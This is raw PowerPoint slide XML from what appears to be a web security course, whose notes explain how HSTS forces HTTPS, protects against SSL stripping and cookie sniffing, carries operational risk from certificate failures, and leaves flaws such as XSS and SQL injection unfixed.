        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="85453229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73C73-06B8-5C87-F30A-F0147CC94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A9976-D355-D2E9-741E-C21EA8D75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319E8-F695-2924-B020-4FAD8DB000B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6F72CB2-39F1-C61E-F405-A3F7CB088D9F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>181</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="75396360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CCDF-FE97-E427-C586-E06221229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82457-0CDF-1BD7-B7FA-B863EC854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F132E-D44D-D721-BC92-E9230B89288C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>From now on, until max-age expires:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Any attempt (link, redirect, user typing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) → browser upgrades silently to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> before sending the request.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If TLS fails (invalid cert, hostname mismatch, etc.), the browser must </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>abort</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and not offer any kind of “Proceed anyway” override.</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99195378-C0DA-9512-EBA7-9F8739F9F922}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>180</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3936477552"/>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47952-B4D5-1892-386A-4AB1677D0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C292A-A1E5-6E43-1D43-950333A09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2EF8E-AF16-E814-3F0B-8CC350732C4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12FD276-F96C-6760-057C-13A2DC3B0E32}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>182</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="299451579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2E53E-CB2B-2379-0025-ECBD8C309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F1501-1B02-2A40-0302-E1039D29B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83DF2-3635-1152-0AEC-9A4E3E2DC3AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Every subdomain (e.g., api.example.com, cdn.example.com, admin.internal.example.com) must be </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTTPS-only</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, too.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48EBF513-56E0-A3BF-EE83-8B059513135E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>182</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="54516233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0F52C-B014-D81D-D26C-788276ABB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FE3AE-497E-9778-DAD4-4975CB5C9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71D27-AD55-53E6-1E21-98EF93AD3A4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2B69007-FAAB-E2B8-8A23-7EEA7DA49533}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>179</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25931653"/>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04D4-45B5-70BC-DBDC-6CA548678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75B48-DBFD-CD0F-5647-70811FCFB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A88E6-B990-B405-9EA9-0B5C43144F9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7EAFCA6-C6A4-5E4E-74F5-6291339C4031}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>184</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="383217360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087C-62A6-B6A5-622C-9DBB6681F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1053C-2574-1CFB-6D1C-8F7DD41EF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B7DA5B-0DE9-22B6-95B4-096FC30E5932}"/>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EFCE3DBB-7F4A-CA9F-0C46-10BFB1CE9D12}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>185</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="280129483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4823B-D233-60BF-1D17-C5FB30D6C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6BD23-4AF4-2CF3-CC85-B0D77D4B0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3FD68-6783-C1CD-4481-75311E6D591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C76B1652-0B26-A335-BCA0-6D4CBC0D8998}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>186</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="126048299"/>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7C22-9CED-E75B-0AB5-11AEDCF70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172CE-A372-7DC4-1069-4B7EE8BCD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E3025-BFDC-D8A4-4D43-DB4BB342616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BCF53AC2-9275-02F5-8C39-77E43E475CCB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>187</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="405400097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56FC-ADEC-8648-712B-B99433E63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834AF-3515-0C15-085F-FEA8299FC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FE850-40D9-5F98-22B3-3705CB51997B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Defense-in-depth for web apps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>HSTS contributes to code security by:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ensuring any </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>API calls, cookie usage, auth flows, or redirects</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> that rely on the browser always happen over HTTPS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Reducing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>attack surface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> against:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Protocol downgrade (SSL stripping).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Session hijacking via sniffed cookies.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Mixed content confusion (linking HTTP resources from an HTTPS page).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{385A3B94-CFC5-34F8-37C5-B46F4B6003E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>188</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1791327499"/>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2E27C-6C91-1DF8-0699-9CCB0CB5F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ED072-460B-158A-0B0E-F35E5D154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B382A-1007-9BCA-0635-0D6D7D0D9684}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This is intentional (it’s part of the security guarantee) but is an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>operational risk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Mitigation:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Good certificate monitoring / alerts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Automated renewal (e.g., Let’s Encrypt).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Testing changes before production.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{37945555-C629-5284-4B2B-65B5FBFE463F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>188</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="92983187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0CE3C-68A0-F147-9AD5-F61B091F5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BB89D-BDF5-ABE7-A9A6-773472418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0A2C5-FDC0-A641-0899-760AB3291800}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Make sure subdomains are configures for HTTPS first.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{37C905D8-3CF7-CADB-B802-6DACF935B6E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>189</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="115246638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AE39-091F-BA86-E2F8-58AB63C86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A3342-EE0A-73DE-1F3B-E6DB1DF18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992D4-955C-B9CE-7632-9CDEA6A03CB7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Make sure subdomains are configures for HTTPS first.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1DB4E09F-7223-6F82-3EB7-22121382BD36}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>191</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="358288480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F0184-A5FF-B6B0-2BF7-343F91CCF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2CC31-6EF8-B9B5-8AE3-BC257A701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B14790-B3A0-4A06-CA5B-9D73B8813D67}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HSTS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>does not</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Fix XSS, SQL injection, CSRF, SSRF, etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Replace proper TLS configuration.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Secure a site that is fundamentally </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>misdesigned</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>But it </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>does</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Enforce encrypted transport for a domain, at the browser level.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Protect against network-level downgrades and cookie theft.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Tighten the guarantees that your code can safely assume about transport security.</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24CFB2DD-B816-E2B3-AF1A-9DC42248F0B6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>188</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" 